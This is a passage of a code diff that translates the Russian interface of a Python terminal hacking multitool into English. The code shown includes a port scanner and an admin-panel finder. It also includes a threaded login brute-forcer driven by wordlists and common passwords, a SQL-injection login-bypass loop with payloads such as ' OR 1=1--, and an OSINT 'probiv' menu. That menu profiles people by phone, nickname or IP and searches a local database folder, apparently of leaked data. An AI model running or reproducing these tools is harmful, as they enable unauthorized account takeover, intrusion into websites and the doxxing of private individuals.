+                                print(f"{w}[{w}*{w}]{w} Progress: {completed}/{total} ports...")
                             
                             if is_open:
                                 open_ports.append((port, protocol))
-                                print(f"{g}[{w}+{g}]{w} Порт {port} открыт | Протокол: {protocol}")
+                                print(f"{g}[{w}+{g}]{w} Port {port} open | Protocol: {protocol}")
                     
                     return open_ports
 
-                target_ip = safe_input(f"{w}[{w}?{w}]{w} Введите IP: ")
+                target_ip = safe_input(f"{w}[{w}?{w}]{w} Enter IP: ")
                 
                 try:
-                    start_port = int(safe_input(f"{w}[{w}?{w}]{w} Введите начальный порт: "))
-                    end_port = int(safe_input(f"{w}[{w}?{w}]{w} Введите конечный порт: "))
+                    start_port = int(safe_input(f"{w}[{w}?{w}]{w} Enter start port: "))
+                    end_port = int(safe_input(f"{w}[{w}?{w}]{w} Enter end port: "))
                 except ValueError:
-                    print(f"{r}[{w}!{r}]{w} Неверный формат портов!")
+                    print(f"{r}[{w}!{r}]{w} Invalid port format!")
                     cont()
                     continue
 
                 if start_port < 1 or end_port > 65535 or start_port > end_port:
-                    print(f"{r}[{w}!{r}]{w} Неверный диапазон портов (1-65535)!")
+                    print(f"{r}[{w}!{r}]{w} Invalid port range (1-65535)!")
                 else:
                     try:
-                        # Проверяем доступность хоста
-                        print(f"{w}[{w}*{w}]{w} Проверяем доступность {target_ip}...")
+                        print(f"{w}[{w}*{w}]{w} Checking host availability {target_ip}...")
                         socket.gethostbyname(target_ip)
                         
                         open_ports = scan_ports(target_ip, start_port, end_port)
                         
-                        print(f"\n{g}[{w}+{g}]{w} Сканирование завершено!")
-                        print(f"{g}[{w}+{g}]{w} Найдено открытых портов: {len(open_ports)}")
+                        print(f"\n{g}[{w}+{g}]{w} Scan completed!")
+                        print(f"{g}[{w}+{g}]{w} Open ports found: {len(open_ports)}")
                         
                         if open_ports:
-                            print(f"\n{w}Открытые порты:")
+                            print(f"\n{w}Open ports:")
                             for port, protocol in sorted(open_ports):
-                                print(f"  {g}•{w} Порт {port}: {protocol}")
+                                print(f"  {g}•{w} Port {port}: {protocol}")
                         else:
-                            print(f"{y}[{w}!{y}]{w} Открытых портов не найдено")
+                            print(f"{y}[{w}!{y}]{w} No open ports found")
                             
                     except socket.gaierror:
-                        print(f"{r}[{w}!{r}]{w} Не удается разрешить адрес {target_ip}")
+                        print(f"{r}[{w}!{r}]{w} Cannot resolve address {target_ip}")
                     except Exception as e:
-                        print(f"{r}[{w}!{r}]{w} Ошибка при сканировании: {e}")
+                        print(f"{r}[{w}!{r}]{w} Scan error: {e}")
                 
                 cont()
 
@@ -1124,7 +1112,7 @@ def main_screen():
                     animation = ['/', '-', '|', '\\']
                     while not stop_event.is_set():
                         for frame in animation:
-                            sys.stdout.write(f'\r{w}[{w}+{w}]{w} Поиск... {frame}')
+                            sys.stdout.write(f'\r{w}[{w}+{w}]{w} Searching... {frame}')
                             sys.stdout.flush()
                             time.sleep(0.2)
 
@@ -1139,11 +1127,11 @@ def main_screen():
                             headers = {'User-Agent': ua.random}
                             for url in googlesearch(query, headers=headers):
                                 stop_event.set()
-                                print(f"{g}[{w}+{g}]{w} Найдено: {url}")
+                                print(f"{g}[{w}+{g}]{w} Found: {url}")
                             stop_event.set()
                         except:
                             stop_event.set()
-                            print(f"{r}[{w}ERROR{r}]{w} Ошибка")
+                            print(f"{r}[{w}ERROR{r}]{w} Error")
 
                 def search_email_info(email_address):
                     search_queries = [f"{dork} {email_address}" for dork in email_dorks]
@@ -1156,11 +1144,11 @@ def main_screen():
                             headers = {'User-Agent': ua.random}
                             for url in googlesearch(query, headers=headers):
                                 stop_event.set()
-                                print(f"{g}[{w}+{g}]{w} Найдено: {url}")
+                                print(f"{g}[{w}+{g}]{w} Found: {url}")
                             stop_event.set()
                         except:
                             stop_event.set()
-                            print(f"{r}[{w}ERROR{r}]{w} Ошибка")
+                            print(f"{r}[{w}ERROR{r}]{w} Error")
 
                 def search_nickname_info(nickname):
                     search_queries = [f"{dork} {nickname}" for dork in nickname_dorks]
@@ -1173,22 +1161,22 @@ def main_screen():
                             headers = {'User-Agent': ua.random}
                             for url in googlesearch(query, headers=headers):
                                 stop_event.set()
-                                print(f"{g}[{w}+{g}]{w} Найдено: {url}")
+                                print(f"{g}[{w}+{g}]{w} Found: {url}")
                             stop_event.set()
                         except:
                             stop_event.set()
-                            print(f"{r}[{w}ERROR{r}]{w} Ошибка")
+                            print(f"{r}[{w}ERROR{r}]{w} Error")
 
-                print(f'{w}[{w}1{w}]{w} Номер Телефона\n{w}[{w}2{w}]{w} Почта\n{w}[{w}3{w}]{w} Никнейм')
-                num = input(f"{w}[{w}?{w}]{w} Введите вариант поиска: ")
+                print(f'{w}[{w}1{w}]{w} Phone Number\n{w}[{w}2{w}]{w} Email\n{w}[{w}3{w}]{w} Nickname')
+                num = input(f"{w}[{w}?{w}]{w} Select search type: ")
                 if num == '1':
-                    phone_number = input(f"{w}[{w}?{w}]{w} Введите номер телефона: ")
+                    phone_number = input(f"{w}[{w}?{w}]{w} Enter phone number: ")
                     search_phone_info(phone_number)
                 elif num == '2':
-                    email_address = input(f"{w}[{w}?{w}]{w} Введите e-mail: ")
+                    email_address = input(f"{w}[{w}?{w}]{w} Enter e-mail: ")
                     search_email_info(email_address)
                 elif num == '3':
-                    nickname = input(f"{w}[{w}?{w}]{w} Введите username: ")
+                    nickname = input(f"{w}[{w}?{w}]{w} Enter username: ")
                     search_nickname_info(nickname)
                 cont()
 
@@ -1201,9 +1189,9 @@ def main_screen():
                         "backend/", "controlpanel/"
                     ]
 
-                    target_site = input(f"{w}[{w}?{w}]{w} Введите URL для поиска админ-панелей: ").strip()
+                    target_site = input(f"{w}[{w}?{w}]{w} Enter URL to search admin panels: ").strip()
                     if not target_site:
-                        print(f"{r}[{w}!{r}]{w} URL не введён.")
+                        print(f"{r}[{w}!{r}]{w} URL not entered.")
                     else:
                         if not target_site.startswith(("http://", "https://")):
                             base = "http://" + target_site
@@ -1216,22 +1204,22 @@ def main_screen():
                             try:
                                 resp = requests.get(url, timeout=5, verify=False)
                                 if resp.status_code == 200:
-                                    print(f"{g}[{w}+{g}]{w} Админ-панель найдена: {url}")
+                                    print(f"{g}[{w}+{g}]{w} Admin panel found: {url}")
                                     found.append(url)
                                 elif resp.status_code == 403:
-                                    print(f"{g}[{w}+{g}]{w} Админ-панель найдена, но нет доступа: {url}")
+                                    print(f"{g}[{w}+{g}]{w} Admin panel found but no access: {url}")
                                 else:
-                                    print(f"{r}[{w}-{r}]{w} Не найдено: {url} (status {resp.status_code})")
+                                    print(f"{r}[{w}-{r}]{w} Not found: {url} (status {resp.status_code})")
                             except requests.RequestException:
-                                print(f"{r}[{w}ERROR{r}]{w} Ошибка при запросе: {url}")
+                                print(f"{r}[{w}ERROR{r}]{w} Request error: {url}")
                         if found:
-                            print(f"\n{g}[{w}+{g}]{w} Найдено {len(found)} панелей:")
+                            print(f"\n{g}[{w}+{g}]{w} Found {len(found)} panels:")
                             for i, u in enumerate(found, 1):
                                 print(f"  {i}. {u}")
                         else:
-                            print(f"{r}[{w}-{r}]{w} Админ-панели не найдены.")
+                            print(f"{r}[{w}-{r}]{w} No admin panels found.")
                 except Exception as e:
-                    print(f"{r}[{w}ERROR{r}]{w} Ошибка: {e}")
+                    print(f"{r}[{w}ERROR{r}]{w} Error: {e}")
                 cont()
             elif select == '11':
                 screen()
@@ -1254,7 +1242,6 @@ def main_screen():
                         self.lock = threading.Lock()
         
                     def get_charset(self, choice):
-                        """Возвращает charset и описание по выбору пользователя"""
                         charsets = {
                             '1': (string.digits, "Digits only (0-9)"),
                             '2': (string.ascii_lowercase, "Lowercase letters only"),
@@ -1275,7 +1262,6 @@ def main_screen():
                         return charsets.get(choice, (string.digits, "Digits only (0-9)"))
         
                     def calculate_total_combinations(self, charset, min_length, max_length):
-                        """Рассчитывает общее количество комбинаций"""
                         charset_size = len(charset)
                         total = 0
                         for length in range(min_length, max_length + 1):
@@ -1309,10 +1295,8 @@ def main_screen():
                         return False
         
                     def load_dictionary_files(self):
-                        """Загружает пароли из всех txt файлов в папке wordlist"""
                         dictionary_path = "wordlist"
                         
-                        # Создаем папку если ее нет
                         if not os.path.exists(dictionary_path):
                             os.makedirs(dictionary_path)
                             print(f"{y}[{w}!{y}]{w} Created directory '{dictionary_path}'")
@@ -1346,10 +1330,8 @@ def main_screen():
                         return list(passwords)
         
                     def dictionary_attack(self, url, username):
-                        """Атака по словарям из txt файлов"""
                         print(f"{b}[{w}*{b}]{w} Starting dictionary attack...")
                         
-                        # Загружаем пароли из словарей
                         dictionary_passwords = self.load_dictionary_files()
                         
                         if not dictionary_passwords:
@@ -1358,10 +1340,8 @@ def main_screen():
                         
                         print(f"{b}[{w}*{b}]{w} Testing {len(dictionary_passwords):,} dictionary passwords...\n")
                         
-                        # Сортируем пароли по длине (сначала короткие)
                         dictionary_passwords.sort(key=len)
                         
-                        # Проверяем пароли из словарей
                         for i, password in enumerate(dictionary_passwords, 1):
                             if self.found:
                                 return True
@@ -1376,7 +1356,6 @@ def main_screen():
                                 self.show_success(username, password)
                                 return True
                             
-                            # Небольшая задержка чтобы не перегружать сервер
                             if i % 10 == 0:
                                 time.sleep(0.01)
                         
@@ -1384,7 +1363,6 @@ def main_screen():
                         return False
         
                     def common_passwords_attack(self, url, username):
-                        """Атака самыми распространенными паролями"""
                         common_passwords = [
                             '123456', 'password', '12345678', 'qwerty', '123456789',
                             '12345', '1234', '111111', '1234567', 'dragon',
@@ -1429,11 +1407,9 @@ def main_screen():
                         return False
         
                     def bruteforce_attack(self, url, username, charset, charset_name, min_length, max_length, threads):
-                        """Выполняет bruteforce атаку с указанным charset"""
                         print(f"\n{c}[{w}*{c}]{w} Bruteforce Attack - {charset_name}")
                         print(f"{c}[{w}*{c}]{w} Starting bruteforce...\n")
             
-                        # Непрерывный перебор без пачек
                         for length in range(min_length, max_length + 1):
                             if self.found:
                                 break
@@ -1441,7 +1417,6 @@ def main_screen():
                             combinations_for_length = len(charset) ** length
                             print(f"\n{b}[{w}*{b}]{w} Length {length} ({combinations_for_length:,} combinations)")
                 
-                            # Используем очередь задач без ожидания пачек
                             with ThreadPoolExecutor(max_workers=threads) as executor:
                                 futures = set()
                     
@@ -1449,23 +1424,19 @@ def main_screen():
                                     if self.found:
                                         break
                         
-                                    # Отправляем задачу в исполнитель
                                     future = executor.submit(self.test_password, url, username, password)
                                     futures.add(future)
                                     
-                                    # Очищаем завершенные задачи чтобы не копить слишком много
                                     if len(futures) >= threads * 2:
                                         done_futures = {f for f in futures if f.done()}
                                         futures -= done_futures
                     
-                                # Ждем завершения оставшихся задач
                                 for future in futures:
                                     if self.found:
                                         break
                                     future.result()
 
                     def multi_bruteforce_attack(self, url, username, min_length, max_length, threads):
-                        """Выполняет bruteforce атаку всеми методами кроме словарей"""
                         charsets = [
                             (string.digits, "Digits only (0-9)"),
                             (string.ascii_lowercase, "Lowercase letters only"),
@@ -1503,57 +1474,46 @@ def main_screen():
                         print(f"{y}[{w}*{y}]{w} Threads: {threads}")
             
                         if charset_choice == '16':
-                            # 16 - ТОЛЬКО СЛОВАРИ
                             print(f"{y}[{w}*{y}]{w} Mode: DICTIONARIES ONLY")
                             print(f"{y}[{w}*{y}]{w} Dictionary folder: wordlist/")
                             
-                            # Сначала словари из wordlist
                             print(f"\n{c}[{w}*{c}]{w} Dictionary Attack from wordlist/ folder")
                             if self.dictionary_attack(url, username):
                                 return
             
-                            # Затем common passwords
                             print(f"\n{c}[{w}*{c}]{w} Common Passwords Attack")
                             if self.common_passwords_attack(url, username):
                                 return
             
                         elif charset_choice == '17':
-                            # 17 - ВСЕ МЕТОДЫ BRUTEFORCE КРОМЕ СЛОВАРЕЙ
                             print(f"{y}[{w}*{y}]{w} Mode: ALL BRUTEFORCE METHODS (no dictionaries)")
                             
-                            # ТОЛЬКО common passwords + bruteforce методы, БЕЗ словарей
                             print(f"\n{c}[{w}*{c}]{w} Common Passwords Attack")
                             if self.common_passwords_attack(url, username):
                                 return
                             
-                            # Затем все bruteforce методы
                             print(f"\n{c}[{w}*{c}]{w} Multi-Method Bruteforce Attack")
                             self.multi_bruteforce_attack(url, username, min_length, max_length, threads)
                             
                         else:
-                            # 1-15 - ТОЛЬКО ВЫБРАННЫЙ BRUTEFORCE МЕТОД (БЕЗ словарей)
                             charset, charset_name = self.get_charset(charset_choice)
                             
                             print(f"{y}[{w}*{y}]{w} Mode: BRUTEFORCE ONLY - {charset_name}")
                             print(f"{y}[{w}*{y}]{w} Charset size: {len(charset)} symbols")
                             
-                            # Расчет общего количества комбинаций
                             total_combinations = self.calculate_total_combinations(charset, min_length, max_length)
                             
-                            # Расчет времени (примерно)
-                            combinations_per_second = 100  # примерная скорость
+                            combinations_per_second = 100
                             estimated_time_seconds = total_combinations / combinations_per_second
                             estimated_time_str = self.format_time(estimated_time_seconds)
                             
                             print(f"{y}[{w}*{y}]{w} Total combinations: {total_combinations:,}")
                             print(f"{y}[{w}*{y}]{w} Estimated time: {estimated_time_str}")
                             
-                            # ТОЛЬКО common passwords + выбранный bruteforce метод, БЕЗ словарей
                             print(f"\n{c}[{w}*{c}]{w} Common Passwords Attack")
                             if self.common_passwords_attack(url, username):
                                 return
             
-                            # Выбранный bruteforce метод
                             print(f"\n{c}[{w}*{c}]{w} Bruteforce Attack - {charset_name}")
                             self.bruteforce_attack(url, username, charset, charset_name, min_length, max_length, threads)
             
@@ -1561,7 +1521,6 @@ def main_screen():
                             self.show_failure()
         
                     def test_password(self, url, username, password):
-                        """Тестирует один пароль и обновляет счетчик"""
                         if self.found:
                             return
                 
@@ -1569,8 +1528,7 @@ def main_screen():
                             self.attempts += 1
                             current_attempt = self.attempts
             
-                        # Плавный вывод без блокировок
-                        if current_attempt % 1 == 0:  # Выводим КАЖДЫЙ пароль
+                        if current_attempt % 1 == 0:
                             sys.stdout.write(f"\rTrying: {password} | Attempt: {current_attempt}")
                             sys.stdout.flush()
             
@@ -1598,7 +1556,6 @@ def main_screen():
                         print(f"{r}[{w}-{r}]{w} Time: {elapsed:.1f}s")
         
                     def format_time(self, seconds):
-                        """Форматирует время в читаемый вид"""
                         if seconds < 60:
                             return f"{seconds:.1f} seconds"
                         elif seconds < 3600:
@@ -1668,38 +1625,37 @@ def main_screen():
                         "' OR 1=1#", "' OR 1=1--", "' OR 1=1/*", "' OR ''='"
                     ]
 
-                    admin_url = input(f"{w}[{w}?{w}]{w} Введите URL страницы логина: ").strip()
+                    admin_url = input(f"{w}[{w}?{w}]{w} Enter login page URL: ").strip()
                     if not admin_url:
-                        print(f"{r}[{w}!{r}]{w} URL не введён.")
+                        print(f"{r}[{w}!{r}]{w} URL not entered.")
                     else:
-                        username = input(f"{w}[{w}?{w}]{w} Введите username: ").strip() or "admin"
+                        username = input(f"{w}[{w}?{w}]{w} Enter username: ").strip() or "admin"
                         found_inj = None
                         for inj in injections:
                             try:
                                 data = {'username': username, 'password': inj}
                                 resp = requests.post(admin_url, data=data, timeout=5, verify=False)
                                 if resp.status_code in (301, 302) or "login successful" in resp.text.lower():
-                                    print(f"{g}[{w}+{g}]{w} SQL-инъекция сработала: {inj}")
+                                    print(f"{g}[{w}+{g}]{w} SQL injection worked: {inj}")
                                     found_inj = inj
                                     break
                                 else:
-                                    print(f"{r}[{w}-{r}]{w} Инъекция не сработала: {inj}")
+                                    print(f"{r}[{w}-{r}]{w} Injection failed: {inj}")
                             except requests.RequestException:
-                                print(f"{r}[{w}ERROR{r}]{w} Ошибка при подключении (инъекция: {inj})")
+                                print(f"{r}[{w}ERROR{r}]{w} Connection error (injection: {inj})")
 
                         if found_inj:
-                            print(f"{g}[{w}+{g}]{w} Доступ получен через SQL-инъекцию: {found_inj}")
+                            print(f"{g}[{w}+{g}]{w} Access granted via SQL injection: {found_inj}")
                         else:
-                            print(f"{r}[{w}-{r}]{w} SQL-инъекции не сработали.")
+                            print(f"{r}[{w}-{r}]{w} SQL injections failed.")
                 except Exception as e:
-                    print(f"{r}[{w}ERROR{r}]{w} Ошибка: {e}")
+                    print(f"{r}[{w}ERROR{r}]{w} Error: {e}")
                 cont()
 
             elif select == '13':
                 screen()
-                print("Пробив")
+                print("OSINT Search")
                 
-                # Импортируем нужные модули
                 try:
                     import phonenumbers
                     import phonenumbers.timezone
@@ -1708,8 +1664,8 @@ def main_screen():
                     import whois
                     from fake_useragent import UserAgent
                 except ImportError as e:
-                    print(f"{r}[{w}-{r}]{w} Ошибка импорта модулей: {e}")
-                    print(f"{y}[{w}!{y}]{w} Установите: pip install phonenumbers python-whois fake-useragent")
+                    print(f"{r}[{w}-{r}]{w} Import error: {e}")
+                    print(f"{y}[{w}!{y}]{w} Install: pip install phonenumbers python-whois fake-useragent")
                     cont()
                     continue
 
@@ -1717,7 +1673,7 @@ def main_screen():
                     try:
                         domain_info = whois.whois(domain)
                         if not domain_info:
-                            return "[-] Информация WHOIS недоступна или домен не найден."
+                            return "[-] WHOIS information unavailable or domain not found."
 
                         domain_name = domain_info.domain_name if domain_info.domain_name else 'N/A'
                         creation_date = domain_info.creation_date if domain_info.creation_date else 'N/A'
@@ -1728,17 +1684,17 @@ def main_screen():
                         name_servers = ", ".join(domain_info.name_servers) if domain_info.name_servers else 'N/A'
 
                         info = f"""
-[+] Домен: {domain_name}
-[+] Зарегистрирован: {creation_date}
-[+] Истекает: {expiration_date}
-[+] Владелец: {registrant_name}
-[+] Организация: {registrant_organization}
-[+] Страна: {registrant_country}
-[+] DNS Серверы: {name_servers}
+[+] Domain: {domain_name}
+[+] Registered: {creation_date}
+[+] Expires: {expiration_date}
+[+] Owner: {registrant_name}
+[+] Organization: {registrant_organization}
+[+] Country: {registrant_country}
+[+] DNS Servers: {name_servers}
 """
                         return info
                     except Exception as e:
-                        return f"[-] Ошибка при получении информации о домене: {str(e)}"
+                        return f"[-] Error getting domain info: {str(e)}"
 
                 def osint_check_account_availability(nick):
                     urls = {
@@ -1762,38 +1718,38 @@ def main_screen():
                             elif response.status_code == 404:
                                 results.append(f"{r}[-]{w} {platform_name}: {url}")
                             else:
-                                results.append(f"{y}[!]{w} {platform_name}: {url} - код {response.status_code}")
+                                results.append(f"{y}[!]{w} {platform_name}: {url} - code {response.status_code}")
                         except:
-                            results.append(f"{y}[!]{w} {platform_name}: {url} - ошибка")
+                            results.append(f"{y}[!]{w} {platform_name}: {url} - error")
                     return "\n".join(results)
 
                 def osint_search_by_ip_api(ip):
                     if not ip:
-                        return "[!] IP-адрес не был введен."
+                        return "[!] IP address not entered."
                     url = f"http://ip-api.com/json/{ip}"
                     try:
                         response = requests.get(url, timeout=10, verify=False)
                         data = response.json()
                         if data.get("status") == "fail":
-                            return f"[!] Ошибка: {data.get('message', 'Неизвестная ошибка')}"
+                            return f"[!] Error: {data.get('message', 'Unknown error')}"
                         else:
                             info = f"""
 [+] IP: {data.get('query', 'N/A')}
-[+] Страна: {data.get('country', 'N/A')}
-[+] Город: {data.get('city', 'N/A')}
-[+] Провайдер: {data.get('isp', 'N/A')}
-[+] Организация: {data.get('org', 'N/A')}
-[+] Часовой пояс: {data.get('timezone', 'N/A')}
+[+] Country: {data.get('country', 'N/A')}
+[+] City: {data.get('city', 'N/A')}
+[+] Provider: {data.get('isp', 'N/A')}
+[+] Organization: {data.get('org', 'N/A')}
+[+] Timezone: {data.get('timezone', 'N/A')}
 """
                             return info
                     except:
-                        return f"[!] Ошибка при запросе для IP {ip}"
+                        return f"[!] Request error for IP {ip}"
 
                 def osint_phone_lookup(phone):
                     try:
                         parsed_phone = phonenumbers.parse(phone, None)
                         if not phonenumbers.is_valid_number(parsed_phone):
-                            return f"[!] Недействительный номер телефона: {phone}"
+                            return f"[!] Invalid phone number: {phone}"
                         
                         carrier_info = phonenumbers.carrier.name_for_number(parsed_phone, "en")
                         country = phonenumbers.geocoder.description_for_number(parsed_phone, "en")
@@ -1802,29 +1758,28 @@ def main_screen():
                         timezona = phonenumbers.timezone.time_zones_for_number(parsed_phone)
                         
                         info = f"""
-[+] Номер: {formatted_number}
-[+] Страна: {country}
-[+] Регион: {region}
-[+] Оператор: {carrier_info if carrier_info else 'N/A'}
-[+] Таймзона: {timezona}
+[+] Number: {formatted_number}
+[+] Country: {country}
+[+] Region: {region}
+[+] Carrier: {carrier_info if carrier_info else 'N/A'}
+[+] Timezone: {timezona}
 [+] Telegram: https://t.me/{phone.lstrip('+')}
 [+] Whatsapp: https://wa.me/{phone.lstrip('+')}
 """
                         return info
                     except Exception as e:
-                        return f"[!] Ошибка при обработке номера: {str(e)}"
+                        return f"[!] Error processing number: {str(e)}"
 
-                # Функции для поиска по базам (аналогичные 6-му пункту но с префиксом osint_)
                 def osint_search_in_databases_category(folder, text):
                     if not text:
-                        print(f"{r}[{w}!{r}]{w} Вы не ввели текст для поиска.")
+                        print(f"{r}[{w}!{r}]{w} No text entered for search.")
                         return
                     
                     if not os.path.exists(folder) or not os.path.isdir(folder):
-                        print(f"{r}[{w}!{r}]{w} Папка не найдена: {folder}")
+                        print(f"{r}[{w}!{r}]{w} Folder not found: {folder}")
                         return
                     
-                    print(f"{w}[{w}*{w}]{w} Ищем '{text}' в {folder}...\n")
+                    print(f"{w}[{w}*{w}]{w} Searching '{text}' in {folder}...\n")
                     found_count = 0
                     file_count = 0
                     
@@ -1834,22 +1789,20 @@ def main_screen():
                             file_count += 1
                             
                             try:
-                                # Показываем прогресс
                                 if file_count % 10 == 0:
-                                    print(f"{w}[{w}*{w}]{w} Обработано файлов: {file_count}...")
+                                    print(f"{w}[{w}*{w}]{w} Processed files: {file_count}...")
                                 
                                 with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                     content = f.read()
                                     if text.lower() in content.lower():
-                                        print(f"{g}[+]{w} Найдено в: {file_path}")
+                                        print(f"{g}[+]{w} Found in: {file_path}")
                                         found_count += 1
                             except Exception as e:
-                                # Пропускаем бинарные файлы и файлы с ошибками
                                 continue
                     
-                    print(f"\n{g}[+]{w} Поиск завершен!")
-                    print(f"{g}[+]{w} Обработано файлов: {file_count}")
-                    print(f"{g}[+]{w} Найдено совпадений: {found_count}")
+                    print(f"\n{g}[+]{w} Search completed!")
+                    print(f"{g}[+]{w} Processed files: {file_count}")
+                    print(f"{g}[+]{w} Matches found: {found_count}")
 
                 def osint_search_all_files_and_print_results(search_keyword, root_folder="Database"):
                     found_count = 0
@@ -1857,14 +1810,14 @@ def main_screen():
                     search_keyword_lower = search_keyword.lower()
 
                     if not search_keyword:
-                        print(f"{r}[{w}!{r}]{w} Нельзя выполнить поиск по пустому запросу.")
+                        print(f"{r}[{w}!{r}]{w} Cannot search empty query.")
                         return
 
-                    print(f"\n{w}[{w}*{w}]{w} Поиск '{search_keyword}' в '{root_folder}'...")
+                    print(f"\n{w}[{w}*{w}]{w} Searching '{search_keyword}' in '{root_folder}'...")
 
                     if not os.path.exists(root_folder) or not os.path.isdir(root_folder):
-                        print(f"{r}[{w}!{r}]{w} Папка '{root_folder}' не найдена.")
-                        print(f"{y}[{w}!{y}]{w} Создайте папку 'Database' и добавьте туда файлы для поиска")
+                        print(f"{r}[{w}!{r}]{w} Folder '{root_folder}' not found.")
+                        print(f"{y}[{w}!{y}]{w} Create 'Database' folder and add files for search")
                         return
 
                     for dirpath, dirnames, filenames in os.walk(root_folder):
@@ -1872,94 +1825,90 @@ def main_screen():
                             full_path = os.path.join(dirpath, filename)
                             processed_files_count += 1
                             
-                            # Показываем прогресс каждые 50 файлов
                             if processed_files_count % 50 == 0:
-                                print(f"{w}[{w}*{w}]{w} Обработано файлов: {processed_files_count}...")
+                                print(f"{w}[{w}*{w}]{w} Processed files: {processed_files_count}...")
 
                             try:
                                 with open(full_path, 'r', encoding='utf-8', errors='ignore') as infile:
                                     for line_num, line in enumerate(infile, 1):
                                         if search_keyword_lower in line.lower():
-                                            print(f"{g}[+]{w} {full_path} (строка {line_num}): {line.strip()}")
+                                            print(f"{g}[+]{w} {full_path} (line {line_num}): {line.strip()}")
                                             found_count += 1
                             except Exception as e:
-                                # Пропускаем бинарные файлы
                                 continue
 
-                    print(f"\n{g}[+]{w} Поиск завершен!")
-                    print(f"{g}[+]{w} Обработано файлов: {processed_files_count}")
-                    print(f"{g}[+]{w} Найдено совпадений: {found_count}")
+                    print(f"\n{g}[+]{w} Search completed!")
+                    print(f"{g}[+]{w} Processed files: {processed_files_count}")
+                    print(f"{g}[+]{w} Matches found: {found_count}")
                     
                     if found_count == 0:
-                        print(f"{y}[{w}!{y}]{w} Совпадений не найдено. Попробуйте другой запрос.")
+                        print(f"{y}[{w}!{y}]{w} No matches found. Try another query.")
 
-                # Главное меню OSINT
                 while True:
-                    print(f"\n{w}[1]{w} Поиск по телефону")
-                    print(f"{w}[2]{w} Поиск по домену") 
-                    print(f"{w}[3]{w} Поиск по никнейму")
-                    print(f"{w}[4]{w} Поиск по IP")
-                    print(f"{w}[5]{w} WHOIS информация")
-                    print(f"{w}[6]{w} Поиск по базе")
-                    print(f"{w}[0]{w} Назад в главное меню")
+                    print(f"\n{w}[1]{w} Phone search")
+                    print(f"{w}[2]{w} Domain search") 
+                    print(f"{w}[3]{w} Nickname search")
+                    print(f"{w}[4]{w} IP search")
+                    print(f"{w}[5]{w} WHOIS information")
+                    print(f"{w}[6]{w} Database search")
+                    print(f"{w}[0]{w} Back to main menu")
                     
-                    choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите тип поиска: ")
+                    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select search type: ")
                     
                     if choice == "1":
-                        phone = safe_input(f"{w}[{w}?{w}]{w} Введите номер телефона: ")
+                        phone = safe_input(f"{w}[{w}?{w}]{w} Enter phone number: ")
                         result = osint_phone_lookup(phone)
                         print(f"\n{result}")
                         
                     elif choice == "2":
-                        domain = safe_input(f"{w}[{w}?{w}]{w} Введите домен: ")
+                        domain = safe_input(f"{w}[{w}?{w}]{w} Enter domain: ")
                         result = osint_get_domain_info(domain)
                         print(f"\n{result}")
                         
                     elif choice == "3":
-                        nick = safe_input(f"{w}[{w}?{w}]{w} Введите никнейм: ")
-                        print(f"\n{w}[{w}*{w}]{w} Проверяем наличие аккаунтов...")
+                        nick = safe_input(f"{w}[{w}?{w}]{w} Enter nickname: ")
+                        print(f"\n{w}[{w}*{w}]{w} Checking account availability...")
                         result = osint_check_account_availability(nick)
                         print(f"\n{result}")
                         
                     elif choice == "4":
-                        ip = safe_input(f"{w}[{w}?{w}]{w} Введите IP-адрес: ")
+                        ip = safe_input(f"{w}[{w}?{w}]{w} Enter IP address: ")
                         result = osint_search_by_ip_api(ip)
                         print(f"\n{result}")
                         
                     elif choice == "5":
-                        domain = safe_input(f"{w}[{w}?{w}]{w} Введите домен для WHOIS: ")
+                        domain = safe_input(f"{w}[{w}?{w}]{w} Enter domain for WHOIS: ")
                         result = osint_get_domain_info(domain)
                         print(f"\n{result}")
                     
                     elif choice == "6":
-                        # Подменю поиска по базам (аналогично 6-му пункту)
                         while True:
-                            print(f"\n{c}[{w}*{c}]{w} Поиск по базам данных")
-                            print(f"{w}[1]{w} Поиск в категориях")
-                            print(f"{w}[2]{w} Поиск по всем файлам")
-                            print(f"{w}[0]{w} Назад")
+                            print(f"\n{c}[{w}*{c}]{w} Database Search")
+                            print(f"{w}[1]{w} Search in categories")
+                            print(f"{w}[2]{w} Search all files")
+                            print(f"{w}[0]{w} Back")
                             
-                            sub_choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите опцию: ")
+                            sub_choice = safe_input(f"\n{w}[{w}?{w}]{w} Select option: ")
                             
                             if sub_choice == "1":
                                 database_root_folder = 'Database'
                                 if not os.path.exists(database_root_folder):
-                                    print(f"{r}[{w}!{r}]{w} Папка '{database_root_folder}' не найдена.")
+                                    print(f"{r}[{w}!{r}]{w} Folder '{database_root_folder}' not found.")
                                     break
                                 
                                 categories = [item for item in os.listdir(database_root_folder) 
                                             if os.path.isdir(os.path.join(database_root_folder, item))]
                                 
                                 if not categories:
-                                    print(f"{r}[{w}!{r}]{w} В папке нет категорий.")
+                                    print(f"{r}[{w}!{r}]{w} No categories in folder.")
                                     break
                                 
-                                print(f"\n{w}Доступные категории:")
+                                print(f"\n{w}Available categories:")
                                 for i, category in enumerate(categories):
                                     print(f"{w}[{i+1}]{w} {category}")
-                                print(f"{w}[0]{w} Отмена")
+                                print(f"{w}[0]{w} Cancel")
                                 
-                                cat_choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите категорию: ")
+                                cat_choice = safe_input(f"\n{w}[{w}?{w}]{w} Select category: ")
                                 if cat_choice == "0":
                                     continue
                                 
@@ -1967,26 +1916,26 @@ def main_screen():
                                     cat_index = int(cat_choice) - 1
                                     if 0 <= cat_index < len(categories):
                                         selected_folder = os.path.join(database_root_folder, categories[cat_index])
-                                        text_to_find = safe_input(f"{w}[{w}?{w}]{w} Текст для поиска в '{categories[cat_index]}': ")
+                                        text_to_find = safe_input(f"{w}[{w}?{w}]{w} Text to search in '{categories[cat_index]}': ")
                                         osint_search_in_databases_category(selected_folder, text_to_find)
                                     else:
-                                        print(f"{r}[{w}!{r}]{w} Неверный выбор")
+                                        print(f"{r}[{w}!{r}]{w} Invalid choice")
                                 except ValueError:
-                                    print(f"{r}[{w}!{r}]{w} Неверный ввод")
+                                    print(f"{r}[{w}!{r}]{w} Invalid input")
                             
                             elif sub_choice == "2":
-                                search_term = safe_input(f"{w}[{w}?{w}]{w} Текст для поиска во всех файлах: ")
+                                search_term = safe_input(f"{w}[{w}?{w}]{w} Text to search in all files: ")
                                 osint_search_all_files_and_print_results(search_term)
                             
                             elif sub_choice == "0":
                                 break
                             else:
-                                print(f"{r}[{w}!{r}]{w} Неверный выбор")
+                                print(f"{r}[{w}!{r}]{w} Invalid choice")
                     
